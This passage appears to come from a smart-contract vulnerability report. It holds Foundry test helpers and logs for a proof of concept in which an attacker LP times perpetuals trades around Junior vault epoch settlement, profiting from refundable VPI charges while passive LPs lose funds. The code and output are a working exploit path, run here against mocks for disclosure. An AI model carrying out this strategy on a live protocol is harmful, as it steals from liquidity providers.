            "Senior value (attack - honest)", int256(atk.seniorValue) - int256(base.seniorValue), 6
        );
        emit log_named_decimal_uint("elapsed hours", atk.elapsed * 1e6 / 1 hours, 6);
    }

    // ---------------------------------------------------------------------
    // Public-path helpers
    // ---------------------------------------------------------------------

    /// Attacker starts with plain USDG: public async Junior deposit, plus trader margin.
    function _enterAttacker(
        uint256 capital
    ) internal {
        settlementToken.mint(ATTACKER_LP, capital);
        _publicJuniorDeposit(capital);
        uint256 margin = 3 * (pool.totalAssets() * MAX_TOTAL_SKEW_BPS / 10_000) / 20;
        _fundTrader(TRADER_A, margin);
        attackerMinted = capital + margin;
    }

    /// Sizes the attacker's open so total skew reaches 39% of current depth, in whole lots, with 5% margin.
    function _sizeLeg() internal {
        leg = ((pool.totalAssets() * 1e12 * (MAX_TOTAL_SKEW_BPS - organicSkewBps) / 10_000) / 100e18) * 100e18;
        legMargin = leg / 1e12 / 20;
    }

    /// Unrelated trader opens and keeps a LONG of `organicSkewBps` of current depth.
    function _openOrganicLong() internal {
        leg = ((pool.totalAssets() * 1e12 * organicSkewBps / 10_000) / 100e18) * 100e18;
        uint256 margin = leg / 1e12 / 20;
        _fundTrader(ORGANIC, 3 * margin);
        _trade(ORGANIC, CfdTypes.Side.LONG, margin, false);
    }

    function _publicJuniorDeposit(
        uint256 assets
    ) internal {
        vm.startPrank(ATTACKER_LP);
        settlementToken.approve(address(juniorVault), assets);
        uint256 requestId = juniorVault.requestDeposit(assets, ATTACKER_LP, ATTACKER_LP);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(requestId));
        _tick();
        vm.prank(KEEPER);
        router.settleLpEpoch(_oracleData());
        assertEq(juniorVault.claimableDepositRequest(requestId, ATTACKER_LP), assets, "deposit activated");
        vm.prank(ATTACKER_LP);
        juniorVault.claimDeposit(requestId, assets, ATTACKER_LP, ATTACKER_LP);
    }

    /// `account` commits a `leg`-sized order; in the next block KEEPER executes it.
    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 margin,
        bool isClose
    ) internal {
        bool buys = (side == CfdTypes.Side.LONG) != isClose;
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(account, router.nextCommitId())),
            side: side,
            sizeDelta: leg,
            marginDelta: margin,
            targetPrice: buys ? 1 : CAP_PRICE,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 1 | 2 | 4,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        _tick();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, _oracleData());
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    /// Pyth update at the current timestamp: constant price, `pythConf` confidence on both feeds.
    function _oracleData() internal view returns (bytes[] memory updateData) {
        bytes32[] memory feedIds = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory feeds = new MockPyth.FeedUpdate[](2);
        for (uint256 i; i < 2; ++i) {
            feeds[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: int64(int256(PRICE)),
                    conf: pythConf,
                    expo: -8,
                    publishTime: block.timestamp,
                    prevPublishTime: block.timestamp - 1
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(feeds);
    }

    function _assertReleaseConfig() internal view {
        (
            uint256 vpi,
            uint256 skew,
            uint256 maint,
            uint256 init_,
            uint256 fad,
            uint256 carry,
            uint256 minBounty,
            uint256 bounty,
            uint256 keeperShare,
            uint256 protocolShare
        ) = engine.riskParams();
        assertEq(vpi, 0.01e18, "release vpiFactor");
        assertEq(skew, 0.4e18, "release maxSkewRatio");
        assertEq(maint, 10, "release maint");
        assertEq(init_, 20, "release init");
        assertEq(fad, 300, "release FAD");
        assertEq(carry, 500, "release base carry");
        assertEq(minBounty, 1e6, "release min bounty");
        assertEq(bounty, 10, "release bounty");
        assertEq(keeperShare, 5000, "release keeper share");
        assertEq(protocolShare, 0, "release protocol share");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(engine.settlementBufferBps(), 25, "release settlement buffer");
        assertEq(engine.frozenCloseSpreadBps(), 50, "release frozen close spread");
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500, "release adverse confidence");
        assertEq(router.pletherOracle().basketMaxConfidenceRatioBps(), 10, "release confidence ceiling");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "release min open notional");
        assertEq(router.maxPendingOrders(), 5, "release max pending orders");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release Senior cap");
        assertEq(pool.maxSeniorShareBps(), 8000, "release Senior share");
    }

    function _tick() internal {
        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);
    }

    function _size(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _vpiAccrued(
        address account
    ) internal view returns (int256 vpiAccrued) {
        (,,,,,, vpiAccrued) = engine.positions(account);
    }

    function _juniorValue(
        address lp
    ) internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(lp));
    }

}
```

Run from the repository root:

```bash
forge test --root packages/perps --match-path test/perps/spec/lp/VpiRoundTripAroundLpSettlement.t.sol -vv
```

Result: all 5 tests pass. In every scenario above break-even the attacker profits and passive Junior LPs lose:

```
Ran 5 tests for test/perps/spec/lp/VpiRoundTripAroundLpSettlement.t.sol:VpiRoundTripAroundLpSettlementTest
[PASS] test_attackerNetByJuniorShare() (gas: 39146394)
Logs:
  === flat book: attacker opens 39% of depth
  attacker share of Junior %: 41.1764
    attacker net: -676.187768
  attacker share of Junior %: 50.0000
    attacker net: 2678.749503
  === 25% existing skew: attacker opens 14% of depth
  attacker share of Junior %: 28.5714
    attacker net: 437.794138
  attacker share of Junior %: 33.3333
    attacker net: 1415.263339
  === 25% existing skew, 10 bp Pyth confidence (release ceiling)
  attacker share of Junior %: 41.1764
    attacker net: 786.462604

[PASS] test_constantDepth_curveAloneRefundsP() (gas: 8013413)
Logs:
  pool depth at open: 80002000.000000
  pool depth at close: 80013982.702007
  VPI P charged on open: 60838.166977
  VPI rebated on close: 60832.096767
  raw curve rebate at close depth: 60832.097566
  ATTACKER NET: 22768.941131
  NEW_LP LOSS: 38048.982606
  PASSIVE JUNIOR LOSS (victim + NEW_LP): 35249.464751

[PASS] test_multiCycle_33PercentShare_existingSkew() (gas: 63458112)
Logs:
  attacker share of Junior %: 33.3333
  attacker USDG ever minted: 5630028.000000
  --- honest baseline (same deposits, redemptions and timing, no attacker trades)
  --- attack
  --- result (all positions closed in both runs)
  victim Junior value, honest: 9994921.071863
  victim Junior value, attack: 9959220.859496
  VICTIM LOSS: 35700.212367
  VICTIM LOSS %: 0.3571
  ATTACKER NET (attack - honest): 13010.064892
  attacker profit over all USDG minted to it, honest: 3136.870903
  attacker profit over all USDG minted to it, attack: 16146.935795
  execution fees to treasury (attack - honest): 22693.112658
  Senior value (attack - honest): 0.076122
  elapsed hours: 26.000277

[PASS] test_multiCycle_80PercentShare_flatBook() (gas: 57004520)
Logs:
  --- honest baseline (same deposits, redemptions and timing, no attacker trades)
  --- attack
  --- result (all positions closed in both runs)
  victim Junior value, honest: 9996547.731384
  victim Junior value, attack: 9677398.959893
  VICTIM LOSS: 319148.771491
  VICTIM LOSS %: 3.1925
  ATTACKER NET (attack - honest): 206780.051025
  attacker profit over all USDG minted to it, honest: -3945.834971
  attacker profit over all USDG minted to it, attack: 202834.216054
  execution fees to treasury (attack - honest): 112398.709962
  Senior value (attack - honest): 0.076122
  elapsed hours: 26.000277
  attacker trading cost: 238864.814335
  nominal execution fees (4 bps x 2 x 9): 224803.040000

[PASS] test_singleEpoch_redemptionIsPricedWithRefundableVpi() (gas: 6660662)
Logs:
  VPI P paid by the pre-boundary open: 60838.166977
  Junior principal used for pricing, honest: 50000176.421117
  Junior principal used for pricing, attack: 50061794.605594
  attacker redeemed, honest: 39999561.631547
  attacker redeemed, attack: 40048855.464970
  attacker trading cost (open + close): 26521.881236
  ATTACKER NET: 22771.952187
  VICTIM LOSS: 35248.676860

Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 436.48ms (1.27s CPU time)
```
